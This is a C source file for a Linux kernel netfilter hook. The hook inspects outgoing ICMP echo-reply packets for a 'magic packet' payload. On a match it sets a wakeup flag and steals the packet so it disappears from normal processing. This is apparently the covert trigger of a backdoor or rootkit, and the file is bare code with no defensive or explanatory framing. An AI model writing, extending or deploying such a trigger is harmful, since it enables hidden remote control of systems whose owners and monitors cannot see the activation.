#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/stddef.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

/* net/include */
//#include "debug.h"
#include "nf_proto.h"

/* net/ */
#include "watcher.h"
#include "m_packet.h"
#include "nf_hook.h"
#include "nf_hook_register.h"

/**
 *
 *
 */
static struct nf_hook_ops _nf_hook_ops = {
        .pf       = PF_INET,
        .priority = NF_IP_PRI_FIRST,
        .hooknum  = NF_INET_LOCAL_OUT,
};

/**
 *
 *
 */
static unsigned int _m_icmp(NF_HOOK_PROTO)
{
        struct iphdr   *iph     = NULL;
        struct icmphdr *icmph   = NULL;
        struct sk_buff *sk_buff = skb;

        size_t        data_len = 0;
        unsigned char *p_data;

        if (!sk_buff)
                return NF_ACCEPT;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,22)
        iph = ip_hdr(skb);
#else
        iph = sk_buff->nh.iph;
#endif

        // verify protocol
        if (iph->protocol != IPPROTO_ICMP)
                return NF_ACCEPT;

        // verify protocol header
        icmph = (struct icmphdr *)(iph + 1);
        if (icmph->type != ICMP_ECHOREPLY)
                return NF_ACCEPT;

        // set data pointer and data_len
        p_data   = (unsigned char  *)(icmph + 1);
        data_len = sk_buff->len - sizeof(struct iphdr) - sizeof(struct icmphdr);

        if (data_len > DATA_MAX)
                return NF_ACCEPT;

        // verify magic packet
        if (m_packet(p_data)) {
                wakeup = true;
                return NF_STOLEN;
        }
        return NF_ACCEPT;
}

void nf_hook_init(void)
{
        _nf_hook_ops.hook = (nf_hookfn *)_m_icmp;
        nf_hook_register(&_nf_hook_ops);
}

void nf_hook_clean(void)
{
        nf_hook_unregister(&_nf_hook_ops);
}

